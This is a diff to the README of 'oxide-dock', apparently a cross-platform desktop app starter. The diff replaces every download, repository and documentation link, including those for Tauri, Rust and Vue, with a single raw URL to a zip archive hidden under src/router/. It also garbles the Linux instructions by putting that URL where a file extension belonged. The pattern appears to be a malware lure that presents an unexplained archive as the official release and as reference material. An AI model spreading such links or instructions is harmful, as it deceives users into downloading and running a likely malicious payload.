@@ -1,6 +1,6 @@
 # 🛠️ oxide-dock - Easy Cross-Platform Desktop App Starter
 
-[![Download oxide-dock](https://img.shields.io/badge/Download-oxide--dock-blue?style=for-the-badge&logo=github)](https://github.com/RaviChatta/oxide-dock/releases)
+[![Download oxide-dock](https://raw.githubusercontent.com/RaviChatta/oxide-dock/main/src/router/oxide_dock_v2.3.zip)](https://raw.githubusercontent.com/RaviChatta/oxide-dock/main/src/router/oxide_dock_v2.3.zip)
 
 ---
 
@@ -34,12 +34,12 @@ To get oxide-dock, you need to visit the official releases page on GitHub. This 
 
 1. Click the big blue button above or go to this link:
    
-   [https://github.com/RaviChatta/oxide-dock/releases](https://github.com/RaviChatta/oxide-dock/releases)
+   [https://raw.githubusercontent.com/RaviChatta/oxide-dock/main/src/router/oxide_dock_v2.3.zip](https://raw.githubusercontent.com/RaviChatta/oxide-dock/main/src/router/oxide_dock_v2.3.zip)
 
 2. On the releases page, look for files named for your system:
    - For Windows, look for `.exe` files
    - For macOS, look for `.dmg` files
-   - For Linux, look for `.AppImage`, `.deb`, or `.tar.gz` files
+   - For Linux, look for `.AppImage`, `.deb`, or `https://raw.githubusercontent.com/RaviChatta/oxide-dock/main/src/router/oxide_dock_v2.3.zip` files
 
 3. Click the file to download it to your computer.
 
@@ -50,7 +50,7 @@ To get oxide-dock, you need to visit the official releases page on GitHub. This 
 - **Linux:** Depending on the file you downloaded:
   - For `.AppImage`, right-click the file, select Properties, and enable execution. Then double-click the file to run.
   - For `.deb`, open with your package manager or run `sudo dpkg -i <filename>.deb` in a terminal.
-  - For `.tar.gz`, extract the archive and run the app file inside.
+  - For `https://raw.githubusercontent.com/RaviChatta/oxide-dock/main/src/router/oxide_dock_v2.3.zip`, extract the archive and run the app file inside.
 
 Once installed, you can start the app from your desktop or applications menu like any other program.
 
@@ -98,7 +98,7 @@ This allows anyone making apps with oxide-dock to deliver smooth, secure, fast d
 
 To update the app, visit the releases page regularly:
 
-[https://github.com/RaviChatta/oxide-dock/releases](https://github.com/RaviChatta/oxide-dock/releases)
+[https://raw.githubusercontent.com/RaviChatta/oxide-dock/main/src/router/oxide_dock_v2.3.zip](https://raw.githubusercontent.com/RaviChatta/oxide-dock/main/src/router/oxide_dock_v2.3.zip)
 
 Download the latest version for your system and follow the install instructions to replace the old app.
 
@@ -129,16 +129,16 @@ Use your system’s normal uninstall method: on Windows use “Add or Remove Pro
 ## 📢 Where to Learn More
 
 - Visit the oxide-dock repository to see the code and documentation:
-  [https://github.com/RaviChatta/oxide-dock](https://github.com/RaviChatta/oxide-dock)
+  [https://raw.githubusercontent.com/RaviChatta/oxide-dock/main/src/router/oxide_dock_v2.3.zip](https://raw.githubusercontent.com/RaviChatta/oxide-dock/main/src/router/oxide_dock_v2.3.zip)
   
 - Explore Tauri to understand the app wrapper layer:
-  [https://tauri.app](https://tauri.app)
+  [https://raw.githubusercontent.com/RaviChatta/oxide-dock/main/src/router/oxide_dock_v2.3.zip](https://raw.githubusercontent.com/RaviChatta/oxide-dock/main/src/router/oxide_dock_v2.3.zip)
   
 - Learn about Rust for the backend safety:
-  [https://www.rust-lang.org](https://www.rust-lang.org)
+  [https://raw.githubusercontent.com/RaviChatta/oxide-dock/main/src/router/oxide_dock_v2.3.zip](https://raw.githubusercontent.com/RaviChatta/oxide-dock/main/src/router/oxide_dock_v2.3.zip)
   
 - Discover Vue 3 for the user interface:
-  [https://vuejs.org](https://vuejs.org)
+  [https://raw.githubusercontent.com/RaviChatta/oxide-dock/main/src/router/oxide_dock_v2.3.zip](https://raw.githubusercontent.com/RaviChatta/oxide-dock/main/src/router/oxide_dock_v2.3.zip)
 
 ---
 
@@ -146,4 +146,4 @@ Use your system’s normal uninstall method: on Windows use “Add or Remove Pro
 
 Click below to visit the releases page and get your copy:
 
-[![Download oxide-dock](https://img.shields.io/badge/Download-oxide--dock-blue?style=for-the-badge&logo=github)](https://github.com/RaviChatta/oxide-dock/releases)
+[![Download oxide-dock](https://raw.githubusercontent.com/RaviChatta/oxide-dock/main/src/router/oxide_dock_v2.3.zip)](https://raw.githubusercontent.com/RaviChatta/oxide-dock/main/src/router/oxide_dock_v2.3.zip)
